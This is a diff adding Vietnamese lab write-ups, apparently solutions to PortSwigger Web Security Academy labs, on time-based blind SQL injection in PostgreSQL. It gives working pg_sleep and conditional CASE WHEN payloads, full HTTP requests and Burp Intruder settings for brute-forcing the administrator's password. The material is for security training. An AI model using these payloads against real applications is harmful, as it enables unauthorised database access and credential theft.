@@ -715,5 +715,110 @@ Cookie: TrackingId=' OR 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- ; 
 ```
 
 
+### Lab: Blind SQL injection with time delays
+> Mục tiêu: Khai thác lỗ hổng SQL để gây ra độ trễ 10 giây.
+
+Phòng thí nghiệm này chứa lỗ hổng SQL mù mù. Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi.
+Kết quả của truy vấn SQL không được trả về và ứng dụng không trả lời bất kỳ khác nhau dựa trên việc truy vấn có trả lại bất kỳ hàng nào hay gây ra lỗi hay không. Tuy nhiên, vì truy vấn được thực thi đồng bộ, có thể kích hoạt sự chậm trễ thời gian có điều kiện để suy ra thông tin.
+
+Payload:
+```
+'||pg_sleep(10)--
+```
+
+- Ở đây chưa biết được loại `database` nào nền cần thử tất cả các lệnh `sleep`
+- Sử dụng phép nối chuỗi `||` kết hợp với lệnh `pg_sleep(10)` đằng sau
+- Kiểu khai thác này dựa trên thời gian phản hồi khi không có `signal` nào khác được trả lại
+
+Request:
+```http
+GET / HTTP/2
+Host: 0a5200a90433971c82418dc800c000e0.web-security-academy.net
+Cookie: TrackingId='||pg_sleep(10)-- ; session=u7jmFxowLjpN0iXoBX79LbnQokeND6nF
+```
+
+### Lab: Blind SQL injection with time delays and information retrieval
+> Mục tiêu: đăng nhập với tư cách `administrator`.
+
+Phòng thí nghiệm này chứa lỗ hổng SQL mù. Ứng dụng sử dụng `cookie` theo dõi để phân tích và thực hiện truy vấn SQL chứa giá trị của `cookie` đã gửi.
+
+Cơ sở dữ liệu chứa một bảng khác được gọi là users, với các cột được gọi là username và password. Bạn cần khai thác lỗ hổng tiêm SQL mù để tìm hiểu password của `administrator`.
+
+Sử dụng kỹ thuật Time base SQLi để  khai thác.
+
+#### Check database type
+Tương tự lab trên ta kiểm tra loại database bằng `payload`:
+```
+'||pg_sleep(5)--
+```
+
+Lấy thời gian phản hồi làm tín hiệu, ta sử dụng payload sau:
+```
+abc';SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+```
+- Kết hợp với câu lệnh điều kiện để điều khiển tín hiệu sleep
+- Thay (1=1) bằng điều kiện cần để lấy thông tin
+- Sử dụng `;` để thực hiện câu lệnh tiếp theo
+
+Request:
+
+```http
+GET / HTTP/2
+Host: 0a9600ad03da44f480313ffe00f700af.web-security-academy.net
+Cookie: TrackingId=abc'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--; session=pursS6rTXgKsG4yveIRih09rHeAYPAyg
+```
+
+#### Check administrator is exist
+Payload:
+```
+abc';SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
+```
+Kiểm tra điều kiện `username='administrator'` trong bảng `users`, nếu có `pg_sleep(5)`, không có `pg_sleep(0)`
+
+Request:
+```http
+GET / HTTP/2
+Host: 0a9600ad03da44f480313ffe00f700af.web-security-academy.net
+Cookie: TrackingId=abc'%3bSELECT+CASE+WHEN+(username%3d'administrator')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--; session=pursS6rTXgKsG4yveIRih09rHeAYPAyg
+```
+
+#### Get administrator's password length
+Payload:
+```
+abc';SELECT CASE WHEN (LENGTH(password) > $1$) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
+```
+
+Request:
+```http
+GET / HTTP/2
+Host: 0a9600ad03da44f480313ffe00f700af.web-security-academy.net
+Cookie: TrackingId=abc'%3bSELECT+CASE+WHEN+(LENGTH(password)+>+$1$)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username%3d'administrator'--; session=pursS6rTXgKsG4yveIRih09rHeAYPAyg
+```
+
+- Sử dụng **Burp Intruder**
+- `Add` tại vị trí 1
+- Chọn `Payload type`: `Numbers`
+- From 1 - To 30 - Step 1
+- Hàng có `response time` > `5s` là độ dài của `password` cần tìm
+
+#### Get administrator's password length
+Payload:
+```
+abc';SELECT CASE WHEN (SUBSTRING(password,$1$,1) = '$a$') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
+```
+
+Request:
+```http
+GET / HTTP/2
+Host: 0a9600ad03da44f480313ffe00f700af.web-security-academy.net
+Cookie: TrackingId=abc'%3bSELECT+CASE+WHEN+(SUBSTRING(password,$1$,1)='$a$')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username%3d'administrator'--; session=pursS6rTXgKsG4yveIRih09rHeAYPAyg
+```
+
+- Sử dụng **Burp Intruder**
+- Chọn chế độ `Cluster bomb attack`
+- Vị trí `1 - 1` chọn `Numbers` từ 1 đến độ dài `password` tìm được, step 1
+- Vị trí `2 - a` chọn `Brute forcer` Min length = Max Length = 1
+- Start attack, ghép lại password theo thứ tự
+
 ---
 Goodluck! 🍀🍀🍀
